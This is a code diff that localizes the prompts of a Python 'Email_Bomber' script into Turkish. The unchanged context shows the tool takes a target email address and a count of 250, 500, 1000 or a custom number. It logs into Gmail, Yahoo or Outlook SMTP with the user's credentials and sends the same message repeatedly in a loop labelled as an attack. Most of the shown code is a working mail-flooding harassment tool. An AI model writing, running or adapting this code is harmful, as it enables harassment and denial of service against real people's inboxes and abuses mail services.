@@ -43,8 +43,8 @@ class Email_Bomber:
     def __init__(self):
         try:
             print(bcolors.RED + '\n[+] Program Başlatılıyor [+]')
-            self.target = str(input(bcolors.GREEN + 'Enter Target Email <: '))
-            self.mode = int(input(bcolors.GREEN + 'Enter Bomb mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <:  '))
+            self.target = str(input(bcolors.GREEN + 'Heder Emaili Giriniz :> '))
+            self.mode = int(input(bcolors.GREEN + 'Bomba Modunu Giriniz (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) :>  '))
             if (self.mode) > int(4) or int(self.mode) < int(1):
                 print('ERROR: Geçersiz Seçenek GoodBye.')
                 sys.exit(1)
@@ -62,19 +62,19 @@ class Email_Bomber:
             elif self.mode == int(3):
                 self.amount = int(250)
             else:
-                self.amount = int(input(bcolors.GREEN + 'Özel Bir Miktar Giriniz <:  '))
+                self.amount = int(input(bcolors.GREEN + 'Özel Bir Miktar Giriniz :>  '))
             print(bcolors.RED + f'\n[+] Bomba Modu: {self.mode} ve {self.amount} e-Postalarını Seçtiniz [+]')    
         except Exception as e:
             print(f'ERROR: {e}')
     def email(self):
         try:
             print(bcolors.RED + '\n[+] Setting up Email [+]')
-            self.server = str(input(bcolors.GREEN + 'Enter Email Server | or Select premade options - 1:Gmail 2:Yahoo 3:Outlook <:  '))   
+            self.server = str(input(bcolors.GREEN + 'Hesaba Gireceğiniz Email Türünü Giriniz - 1:Gmail 2:Yahoo 3:Outlook :>  '))   
             premade = ['1', '2', '3']
             default_port = True 
             if self.server not in premade:
                 default_port = False
-                self.port = int(input(bcolors.GREEN + 'Enter Port Number <:  '))
+                self.port = int(input(bcolors.GREEN + 'Port Numarası Giriniz :>  '))
             
             if default_port == True:
                 self.port = int(587)
@@ -85,10 +85,10 @@ class Email_Bomber:
                 self.server = 'smtp.mail.yahoo.com'
             elif self.server == '3':
                 self.server = 'smtp-mail.outlook.com'
-            self.fromAddr = str(input(bcolors.GREEN + 'Enter From Addres <:  '))
-            self.fromPwd = str(input(bcolors.GREEN + 'Enter From Password <:  '))
-            self.subject = str(input(bcolors.GREEN + 'Enter subject <:  '))
-            self.message = str(input(bcolors.GREEN + 'Enter message <:  '))
+            self.fromAddr = str(input(bcolors.GREEN + 'Emailinizi Giriniz :>  '))
+            self.fromPwd = str(input(bcolors.GREEN + 'Şifrenizi Giriniz :>  '))
+            self.subject = str(input(bcolors.GREEN + 'Konuyu Giriniz :>  '))
+            self.message = str(input(bcolors.GREEN + 'Mesajı Giriniz :>  '))
 
             self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
             ''' % (self.fromAddr, self.target, self.subject, self.message)
@@ -110,11 +110,11 @@ class Email_Bomber:
             print(f'ERROR: {e}')
 
     def attack(self):
-        print(bcolors.RED + '\n[+] Attacking.... [+]')
+        print(bcolors.RED + '\n[+] Saldırı Başlatılıyor... [+]')
         for email in range(self.amount+1):
             self.send()
         self.s.close()
-        print(bcolors.RED + '\n[+] Attack Finished [+]')   
+        print(bcolors.RED + '\n[+] Saldırı Sona Erdi [+]')   
         sys.exit(0)
 
 
